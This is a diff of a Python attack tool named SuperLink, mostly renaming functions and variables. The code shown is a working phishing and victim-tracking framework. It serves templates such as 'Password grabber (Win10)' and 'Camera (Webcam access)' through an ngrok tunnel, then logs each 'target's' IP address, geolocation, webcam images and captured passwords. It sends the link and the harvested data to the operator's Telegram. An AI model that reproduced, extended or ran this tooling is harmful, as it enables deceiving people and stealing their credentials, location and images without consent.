@@ -4,27 +4,27 @@ from sys import exit, version
 
 
 def check_dependency():
-    tprint = TMprint()
+    t_print = TmPrint()
     print("\n")
-    tprint.out(" [#] Checking dependencies... ")
-    main_pkgs = ['requests', 'colorama',
-                 'argparse', 'pyngrok', 'Pillow',
-                 'zipfile36']
+    t_print.out(" [#] Checking dependencies... ")
+    main_pkg_list = ['requests', 'colorama',
+                     'argparse', 'pyngrok', 'Pillow',
+                     'zipfile36']
     if name == "nt":
-        main_pkgs.extend(["neofetch-win", "win10toast"])
+        main_pkg_list.extend(["neofetch-win", "win10toast"])
         pip = "pip"
     else:
         pip = "pip3"
-    for pkg in main_pkgs:
+    for pkg in main_pkg_list:
         lib_info = str(check_output(f'{pip} show {pkg}'))
         if "not found" not in lib_info:
             pass
         else:
-            tprint.out(f" [!] '{pkg}' is not installed!")
+            t_print.out(f" [!] '{pkg}' is not installed!")
             exit()
     does_php_exist = which('php')
     if does_php_exist is None:
-        tprint.out(f" [!] 'php' is not installed!")
+        t_print.out(f" [!] 'php' is not installed!")
         exit()
     else:
         pass
@@ -75,8 +75,8 @@ script_title = f"SuperLink  v{script_version}  By IHosseini"
 
 
 def banner():
-    TMsettitle(script_title)
-    TMcleaner()
+    tm_settitle(script_title)
+    tm_cleaner()
     neofetch()
 
 
@@ -89,7 +89,7 @@ def check_py_version():
         pass
 
 
-def win10notif(
+def win10_notify(
         title: str,
         msg: str,
         icon: str = None,
@@ -112,15 +112,15 @@ def neofetch():
     system("neofetch -c green -ac red" if name == "nt" else "neofetch")
 
 
-def TMsettitle(title: str):
+def tm_settitle(title: str):
     system(f"title {title}")
 
 
-def TMcleaner():
+def tm_cleaner():
     system("cls" if name == "nt" else "clear")
 
 
-def listFiles(dir_path: str = None):
+def list_files(dir_path: str = None):
     if dir_path is None:
         files = listdir(".")
         num_files = 1
@@ -138,7 +138,7 @@ def listFiles(dir_path: str = None):
             print(" [>] There is no file to show!")
 
 
-def makedirs():
+def make_dirs():
     Path("./Logs/PHP-Log").mkdir(parents=True, exist_ok=True)
     Path("./Logs/Saved-IP").mkdir(parents=True, exist_ok=True)
     Path("./Logs/Saved-Info").mkdir(parents=True, exist_ok=True)
@@ -146,7 +146,7 @@ def makedirs():
     Path("./Webcam-Images").mkdir(parents=True, exist_ok=True)
 
 
-def cwdir():
+def current_working_dir():
     cwd = getcwd()
     user_system = uname()[0]
     if user_system != "Windows":
@@ -161,24 +161,24 @@ def press_enter():
           " Press [" + LR + "ENTER" + LW + "] to continue... ")
 
 
-def getRedirLink():
+def get_link():
     username = getlogin()
-    cwd = cwdir()
+    cwd = current_working_dir()
     proto_li = ["http://", "https://"]
     banner()
     sleep(0.1)
     print("\n" + LG + " [" + LR + "!" + LG + "]" + LW + " Press [" + LB + "Ctrl+C" + LW + "] to exit.")
     sleep(0.1)
     print("\n\n" + LG + " [" + LR + "!" + LG + "]" + LB + " Please enter the URL.")
-    redir_link = input("\n" + LG + " ┌─(" + LC + f"{username}" + LR + "@" +
-                       LC + "SuperLink" + LG + ")─[" + LC + f"./{cwd}" + LG + "]" + """
+    redirect_link = input("\n" + LG + " ┌─(" + LC + f"{username}" + LR + "@" +
+                          LC + "SuperLink" + LG + ")─[" + LC + f"./{cwd}" + LG + "]" + """
  └──╼/# """ + LW + "")
-    if len(redir_link) == 0:
+    if len(redirect_link) == 0:
         return None
     else:
         for p in proto_li:
-            redir_link = redir_link.replace(p, "")
-        return redir_link
+            redirect_link = redirect_link.replace(p, "")
+        return redirect_link
 
 
 def home_options():
@@ -209,14 +209,14 @@ def home_options():
 def start():
     icons_path = "./Modules/icons/"
     username = getlogin()
-    cwd = cwdir()
+    cwd = current_working_dir()
     _del_ = DeleteFilesAndDirs()
-    tprint = TMprint()
+    t_print = TmPrint()
     check_updates()
     while True:
         try:
             init()
-            makedirs()
+            make_dirs()
             home_options()
             opt = str(input("\n" + LG + " ┌─(" + LC + f"{username}" + LR + "@" +
                             LC + "SuperLink" + LG + ")─[" + LC + f"~/{cwd}" + LG + "]" + """
@@ -230,7 +230,7 @@ def start():
             elif opt == "02":
                 MainServer(temps.loadPath("4")).create_data_link()
             elif opt == "03":
-                rd_link = getRedirLink()
+                rd_link = get_link()
                 if rd_link is None:
                     print("\n" + LG + " [" + LR + "!" + LG + "]" + LY + " Have not entered any URL!")
                     press_enter()
@@ -243,28 +243,27 @@ def start():
                 MainServer(temps.loadPath("3")).create_data_link()
             elif opt == "06":
                 print("\n" + LC + " [>] TXT Files: \n" + LY)
-                listFiles("./Target-Data")
+                list_files("./Target-Data")
                 print("\n" + LC + " [>] Webcam IMG Files: \n" + LY)
-                listFiles("./Webcam-Images")
+                list_files("./Webcam-Images")
                 press_enter()
             elif opt == "07":
                 banner()
                 print("\n")
-                tprint.out(LG + " [>] Deleting targets files... ")
+                t_print.out(LG + " [>] Deleting targets files... ")
                 sleep(3)
                 _del_.deleteAllFilesByType("txt", "./Target-Data")
                 _del_.deleteAllFilesByType("png", "./Target-Data")
                 _del_.deleteAllFilesByType("png", "./Webcam-Images")
-                tprint.out(LG + " [>] Targets files deleted successfully! ")
-                win10notif("Files deleted!",
-                           "All of the targets files (TXT & IMG) have been successfully deleted!",
-                           icon=icons_path + "trash_empty.ico")
+                t_print.out(LG + " [>] Targets files deleted successfully! ")
+                win10_notify("Files deleted!", "All of the targets files (TXT & IMG) have been successfully deleted!",
+                             icon=icons_path + "trash_empty.ico")
                 press_enter()
                 continue
             elif opt == "08":
                 check_updates()
             elif opt == "99":
-                TMcleaner()
+                tm_cleaner()
                 break
             else:
                 print("\n" + LG + " [" + LR + "!" + LG + "]" + LY + " Your entry is not available in the options!")
@@ -272,36 +271,35 @@ def start():
         except Exception as error:
             print("\n\n" + LR + " [#start] ERROR : " + str(error))
             press_enter()
-            TMcleaner()
+            tm_cleaner()
             break
         except KeyboardInterrupt:
-            TMcleaner()
+            tm_cleaner()
             break
 
 
 def check_updates():
-    tprint = TMprint()
+    t_print = TmPrint()
     updater = CheckUpdates()
     up_downloader = GetNewUpdate()
     banner()
     print("\n\n")
-    tprint.out(LG + " [>] Checking for new update...")
+    t_print.out(LG + " [>] Checking for new update...")
     if updater.checkForUpdates is False:
-        tprint.out(LG + " [>] Everything is up-to-date!")
-        win10notif("Up-To-Date!",
-                   "Everything has been checked and there is not any new update!",
-                   icon="./Modules/icons/green_check.ico")
+        t_print.out(LG + " [>] Everything is up-to-date!")
+        win10_notify("Up-To-Date!", "Everything has been checked and there is not any new update!",
+                     icon="./Modules/icons/green_check.ico")
     elif updater.checkForUpdates is None:
-        tprint.out(LY + " [!] Something went wrong!!!")
-        win10notif("Something went wrong!",
-                   "Something unknown happened while checking for new update!\nplease check your network connection.",
-                   icon="./Modules/icons/red_cross.ico")
+        t_print.out(LY + " [!] Something went wrong!!!")
+        win10_notify("Something went wrong!",
+                     "Something unknown happened while checking for new update!\nplease check your network connection.",
+                     icon="./Modules/icons/red_cross.ico")
     else:
-        tprint.out(LY + f" [!] There is a new update available! (" +
-                   LR + f"v{updater.checkForUpdates}" + LY + ")")
-        win10notif("New update available!",
-                   f"A new update released on github by the author (IHosseini)\nnew version: {updater.checkForUpdates}",
-                   icon="./Modules/icons/exclamation_mark.ico")
+        t_print.out(LY + f" [!] There is a new update available! (" +
+                    LR + f"v{updater.checkForUpdates}" + LY + ")")
+        win10_notify("New update available!",
+                     f"A new update released on github by the author\nnew version: {updater.checkForUpdates}",
+                     icon="./Modules/icons/exclamation_mark.ico")
         up_file = f"SuperLink-v{updater.checkForUpdates}.zip"
         select_down = input("\n\n" + LG + " [" + LR + "?" + LG + "]" +
                             LB + f" Do you want to download the new version ({updater.checkForUpdates}) ? [y/n] " +
@@ -309,26 +307,26 @@ def check_updates():
         if select_down == "y" or select_down == "yes":
             banner()
             print("\n\n")
-            tprint.out(LG + f" [>] Downloading new version ({updater.checkForUpdates}) ...")
+            t_print.out(LG + f" [>] Downloading new version ({updater.checkForUpdates}) ...")
             try:
                 up_downloader.download(f"../{up_file}")
-                tprint.out(LG + f" [>] Downloaded successfully!")
-                win10notif("Update files downloaded!",
-                           "New update files successfully downloaded and gonna be extracted soon!",
-                           icon="./Modules/icons/download_folder.ico")
-                tprint.out(LG + f" [>] Extracting new update file ({up_file})...")
+                t_print.out(LG + f" [>] Downloaded successfully!")
+                win10_notify("Update files downloaded!",
+                             "New update files successfully downloaded and gonna be extracted soon!",
+                             icon="./Modules/icons/download_folder.ico")
+                t_print.out(LG + f" [>] Extracting new update file ({up_file})...")
                 sleep(2)
                 up_downloader.extract(f"../{up_file}", path=f"../{up_file}".replace(".zip", ""))
-                tprint.out(LG + f" [>] Update file successfully extracted in " +
-                           LW + f"[../{up_file}]".replace(".zip", ""))
+                t_print.out(LG + f" [>] Update file successfully extracted in " +
+                            LW + f"[../{up_file}]".replace(".zip", ""))
             except Exception as error:
-                tprint.out(LR + f" [>] Something went wrong while updating!")
+                t_print.out(LR + f" [>] Something went wrong while updating!")
             press_enter()
         else:
             pass
 
 
-class TMprint:
+class TmPrint:
     def __init__(self):
         self.max_len = 0
 
@@ -351,29 +349,29 @@ class MainServer:
         self.ngrok_region = self.conf_file.loadRegion
         self.user_chat_id = self.conf_file.loadChatId
         self.telebot = TelegramBot(self.user_chat_id)
-        self.tprint = TMprint()
+        self.t_print = TmPrint()
         self.time_opt = TimeOptions()
 
     def create_data_link(self):
         banner()
         icons_path = "./Modules/icons/"
         print("\n\n")
-        self.tprint.out(LG + " [>] Processing...")
+        self.t_print.out(LG + " [>] Processing...")
         sleep(3)
         template_name = self.template_path.split("/")[2]
-        self.tprint.out(LG + " [>] Checking port & protocol...")
+        self.t_print.out(LG + " [>] Checking port & protocol...")
         sleep(3)
         if self.proto is None:
             proto = self.def_proto
         else:
             proto = self.proto
         try:
-            self.tprint.out(LG + " [>] Starting PHP server on port" + LW + f" ({self.def_port})")
+            self.t_print.out(LG + " [>] Starting PHP server on port" + LW + f" ({self.def_port})")
             sleep(3)
             with open("./Logs/PHP-Log/PHP_SERVER_LOG.log", "w") as php_log:
                 Popen(("php", "-S", f"localhost:{self.def_port}", "-t", self.template_path),
                       stderr=php_log, stdout=php_log)
-                self.tprint.out(LG + " [>] Generating the link...")
+                self.t_print.out(LG + " [>] Generating the link...")
                 link = str(ngrok.connect(self.def_port, proto,
                                          region=self.ngrok_region,
                                          auth_token=self.ngrok_auth_token))
@@ -381,31 +379,30 @@ class MainServer:
                 link = link.replace("http", "https")
                 link = link.split(" ")[1]
                 link = link.replace('"', '')
-                self.tprint.out(LG + " [>] All done!")
-                win10notif("Server started!",
-                           f"PHP & Ngrok server successfully started on port ({self.def_port})",
-                           icon=icons_path + "green_check.ico")
-                self.tprint.out(LG + " [>] Template Name : " + LW + template_name)
+                self.t_print.out(LG + " [>] All done!")
+                win10_notify("Server started!", f"PHP & Ngrok server successfully started on port ({self.def_port})",
+                             icon=icons_path + "green_check.ico")
+                self.t_print.out(LG + " [>] Template Name : " + LW + template_name)
                 sleep(0.4)
                 print("\n\n" + LG + " [>] Your Link : " + LW + link)
                 sleep(0.4)
                 print("\n" + LG + " [>] Localhost Mode : " + LW + local_mode + "\n")
                 sleep(0.4)
-                self.tprint.out(LG + " [>] Sending the link to your" + LW + " telegram" + LG + " ... ")
+                self.t_print.out(LG + " [>] Sending the link to your" + LW + " telegram" + LG + " ... ")
                 try:
                     self.telebot.sendMessage(
                         f"✅ New link created!\n\n🌐 Template name : {template_name}\n🔗 Link : {link}" +
                         f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
-                    self.tprint.out(
+                    self.t_print.out(
                         LG + " [>] The link have been sent to your " + LW + "telegram" + LG + " successfully!\n")
                 except Exception as error:
-                    self.tprint.out(LR + " [>]" + LY + " Failed to send the link to your " +
-                                    LW + "telegram " + LY + "!")
+                    self.t_print.out(LR + " [>]" + LY + " Failed to send the link to your " +
+                                     LW + "telegram " + LY + "!")
                     print("")
                 print(LR + "\n --------------------------------- \n")
                 print(LG + " [!] You can close the server by pressing" +
                       LW + " [" + LR + "Ctrl+C" + LW + "]" + LG + " ... \n")
-                self.getUserData()
+                self.get_user_data()
         except Exception as error:
             if "The ngrok process errored on start" in str(error):
                 print("\n\n" + LY + " [!] Something went wrong while creating the link!\n")
@@ -423,7 +420,7 @@ class MainServer:
 
     @staticmethod
     def kill_php():
-        TMcleaner()
+        tm_cleaner()
         if name != "nt":
             pass
         else:
@@ -441,61 +438,59 @@ class MainServer:
         else:
             return None
 
-    def getUserData(self):
+    def get_user_data(self):
         template_name = self.template_path.split("/")[2]
         icons_path = "./Modules/icons/"
         temp_path_li = ["./Templates/Music Player", "./Templates/Smiling Moon",
                         "./Templates/NearYou", "./Templates/Camera (Webcam access)",
                         "./Templates/Password grabber (Win10)",
                         "./Templates/Weather forecast"]
-        tprint = TMprint()
+        t_print = TmPrint()
         number_of_target = 1
         file_path_info = "./Logs/Saved-Info/Info.json"
         file_path_ip = "./Logs/Saved-IP/IP-Address.txt"
         file_path_loc = "./Logs/Saved-Info/Loc-Info.json"
         while True:
             try:
-                TARGET_IP = self.get_ip_addr()
-                if TARGET_IP is not None:
-                    win10notif("Target detected!",
-                               "New target opened the link!",
-                               icons_path + "devilish_earth.ico")
+                target_ip = self.get_ip_addr()
+                if target_ip is not None:
+                    win10_notify("Target detected!", "New target opened the link!", icons_path + "devilish_earth.ico")
                     target_data_file = f"./Target-Data/{self.time_opt.calendar}_T{number_of_target}.txt"
-                    if "149.154" in TARGET_IP:
+                    if "149.154" in target_ip:
                         pass
                     else:
-                        tprint.out(LY + " <! " + LB + "-----" + LY +
-                                   f" {number_of_target} " + LB + "-----" + LY + " !> ")
-                        print(LG + f"\n\n [>] IP   : " + LW + f"{TARGET_IP}" +
+                        t_print.out(LY + " <! " + LB + "-----" + LY +
+                                    f" {number_of_target} " + LB + "-----" + LY + " !> ")
+                        print(LG + f"\n\n [>] IP   : " + LW + f"{target_ip}" +
                               LG + " [>] Time : " + LW + f"{self.time_opt.calendar} | {self.time_opt.clock}")
                         with open(file_path_ip, "w") as clean_ip_file:
                             clean_ip_file.write("")
-                    tprint.out(LG + " [>] Saving target GeoIP data... ")
+                    t_print.out(LG + " [>] Saving target GeoIP data... ")
                     sleep(2)
                     if stat(file_path_info).st_size != 0:
                         with open(file_path_info, "r") as info_file:
                             info_content = info_file.read()
                         info_data = loads(info_content)["info"]
-                        ip_data = GeolocationIP(TARGET_IP)
+                        ip_data = GeolocationIP(target_ip)
                         ip_data = ip_data.getData
                         full_target_data = implement_userdata(info_data, ip_data)
                         with open(target_data_file, "w") as target_info:
                             target_info.write(full_target_data)
-                        tprint.out(LG + f" [>] Target GeoIP data successfully saved in" +
-                                   LW + f" [{target_data_file}]" + LG + " &" +
-                                   LW + f" [./Target-Data/IMG_T{number_of_target}.png]")
+                        t_print.out(LG + f" [>] Target GeoIP data successfully saved in" +
+                                    LW + f" [{target_data_file}]" + LG + " &" +
+                                    LW + f" [./Target-Data/IMG_T{number_of_target}.png]")
                         print("")
                     else:
-                        tprint.out(LG + " [>] Target GeoIP data could not be saved!")
+                        t_print.out(LG + " [>] Target GeoIP data could not be saved!")
                         print("")
                     if self.template_path == temp_path_li[3]:
                         print(LG + " [>] New images will be available in " + LW + "[./Webcam-Images]")
                     elif self.template_path == temp_path_li[-2]:
                         print(LG + " [>] If you catch any passwords, they will be in " +
-                              LW + f"[./Target-Data/{self.time_opt.calendar}_PASSWDS.txt]")
+                              LW + f"[./Target-Data/{self.time_opt.calendar}_PASSWORDS.txt]")
                     elif self.template_path == temp_path_li[-1]:
                         if stat(file_path_loc).st_size != 0:
-                            tprint.out(LG + " [>] Saving target Location data... ")
+                            t_print.out(LG + " [>] Saving target Location data... ")
                             sleep(2)
                             with open(file_path_loc, "r") as loc_file:
                                 loc_content = loc_file.read()
@@ -514,38 +509,37 @@ class MainServer:
                                                   f"-> Google Maps Link : google.com/maps/place/{latitude}+{longitude}")
                             with open(file_path_loc, "w") as loc_file:
                                 loc_file.write("")
-                            tprint.out(LG + " [>] Target Location data successfully appended to " +
-                                       LW + f"[{target_data_file}]")
+                            t_print.out(LG + " [>] Target Location data successfully appended to " +
+                                        LW + f"[{target_data_file}]")
                             print("")
                         else:
-                            tprint.out(LG + " [>] Target Location data could not be saved!")
+                            t_print.out(LG + " [>] Target Location data could not be saved!")
                             print("")
                     else:
                         continue
                     try:
-                        tprint.out(LG + " [>] Sending target data to your" + LW + " telegram" + LG + " ...")
+                        t_print.out(LG + " [>] Sending target data to your" + LW + " telegram" + LG + " ...")
                         with open(target_data_file, "r") as data:
-                            imagedata = Data2Image(f"./Target-Data/IMG_T{number_of_target}.png")
-                            imagedata.write_image(data.read().replace("------", ""), "./Modules/fonts/arial.ttf",
-                                                  25, "RGB", (1024, 1024), (250, 97, 97),
-                                                  (255, 255, 255))
+                            image_data = Data2Image(f"./Target-Data/IMG_T{number_of_target}.png")
+                            image_data.write_image(data.read().replace("------", ""), "./Modules/fonts/arial.ttf",
+                                                   25, "RGB", (1024, 1024), (250, 97, 97),
+                                                   (255, 255, 255))
                             self.telebot.sendDocument(target_data_file,
-                                                      caption=f"*Target Number* `{number_of_target}`\n" +
-                                                              f"*Template name* : `{template_name}`\n"
-                                                              f"*Time* : {self.time_opt.calendar} {self.time_opt.clock}",
+                                                      caption=f"*Target Number*: `{number_of_target}`\n" +
+                                                              f"*Template name*: `{template_name}`\n"
+                                                              f"*Time*: {self.time_opt.calendar} {self.time_opt.clock}",
                                                       parse_mode="Markdown")
-                        tprint.out(LG + " [>] Data file successfully sent to your" + LW + " telegram" + LG + " !")
+                        t_print.out(LG + " [>] Data file successfully sent to your" + LW + " telegram" + LG + " !")
                         print("")
                     except Exception as error:
-                        tprint.out(LR + " [>]" + LY + " Failed to send the target data to your " +
-                                   LW + "telegram " + LY + "! (check your connection)")
+                        t_print.out(LR + " [>]" + LY + " Failed to send the target data to your " +
+                                    LW + "telegram " + LY + "! (check your connection)")
                         print("")
-                    win10notif("Data successfully saved!",
-                               f"Target data successfully saved in [{target_data_file}]",
-                               icon=icons_path + "download_folder.ico")
+                    win10_notify("Data successfully saved!", f"Target data successfully saved in [{target_data_file}]",
+                                 icon=icons_path + "download_folder.ico")
                     print("")
-                    tprint.out(LG + " [>] " + LC + "Waiting for other " + LR + "targets" +
-                               LC + " interaction... ")
+                    t_print.out(LG + " [>] " + LC + "Waiting for other " + LR + "targets" +
+                                LC + " interaction... ")
                     number_of_target += 1
                 else:
                     continue
